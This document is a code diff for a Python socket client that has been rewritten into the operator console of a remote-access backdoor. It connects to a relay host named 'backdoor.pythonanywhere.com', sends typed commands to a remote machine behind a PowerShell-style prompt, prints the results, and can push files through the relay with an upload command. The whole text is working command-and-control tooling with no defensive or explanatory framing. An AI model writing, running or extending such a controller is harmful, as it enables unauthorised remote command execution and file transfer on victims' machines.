@@ -1,39 +1,85 @@
 import socket
 import json
+import os
 
-server_addr = ('127.0.0.1', 1337)
+relay_addr = ('backdoor.pythonanywhere.com', 9000)
 
-def send_msg(soc, msg):
-    data = json.dumps(msg).encode()
-    length = len(data).to_bytes(4, byteorder='big')
-    soc.sendall(length + data)
-
-def recv_msg(soc):
-    length = int.from_bytes(soc.recv(4), byteorder='big')
+def recv_msg(conn):
+    length_bytes = conn.recv(4)
+    if not length_bytes:
+        raise ConnectionError("Disconnected")
+    length = int.from_bytes(length_bytes, byteorder='big')
     data = b''
     while len(data) < length:
-        more = soc.recv(length - len(data))
-        if not more:
-            raise ConnectionError("Server disconnected")
-        data += more
+        chunk = conn.recv(length - len(data))
+        if not chunk:
+            raise ConnectionError("Disconnected during receive")
+        data += chunk
     return json.loads(data.decode())
 
-def main():
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        s.connect(server_addr)
-        send_msg(s, 'cd')
-        path_loc = recv_msg(s).get('cwd', '')
+def send_msg(conn, msg):
+    encoded = json.dumps(msg).encode()
+    length = len(encoded).to_bytes(4, byteorder='big')
+    conn.sendall(length + encoded)
 
+def upload_file(conn, filepath):
+    if not os.path.isfile(filepath):
+        print("File not found.")
+        return
+
+    size = os.path.getsize(filepath)
+    filename = os.path.basename(filepath)
+    header = {
+        "action": "upload",
+        "filename": filename,
+        "size": size
+    }
+
+    send_msg(conn, header)
+
+    with open(filepath, 'rb') as f:
         while True:
-            i = input(f'PS {path_loc.strip()}>')
-            send_msg(s, i)
-            if i == 'exit':
+            chunk = f.read(4096)
+            if not chunk:
                 break
-            msg = recv_msg(s)
-            if 'output' in msg:
-                print(msg['output'].strip())
-            elif 'cwd' in msg:
-                path_loc = msg['cwd']
+            conn.sendall(chunk)
+
+    resp = recv_msg(conn)
+    print(resp.get("output", "[No response]"))
+
+def main():
+    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    conn.connect(relay_addr)
+    conn.sendall(b"client\n")
+    print("[+] Connected to relay.")
+
+    cwd = os.getcwd()
+
+    try:
+        while True:
+            command = input(f"PS {cwd}> ").strip()
+
+            if command.startswith("upload "):
+                filepath = command[7:].strip()
+                upload_file(conn, filepath)
+                continue
+
+            send_msg(conn, command)
+
+            if command == "exit":
+                break
+
+            response = recv_msg(conn)
+            if 'cwd' in response:
+                cwd = response['cwd']
+            elif 'output' in response:
+                print(response['output'].strip())
+
+    except Exception as e:
+        print(f"[!] Error: {e}")
+    finally:
+        conn.close()
+        print("[-] Disconnected from relay.")
 
 if __name__ == '__main__':
     main()
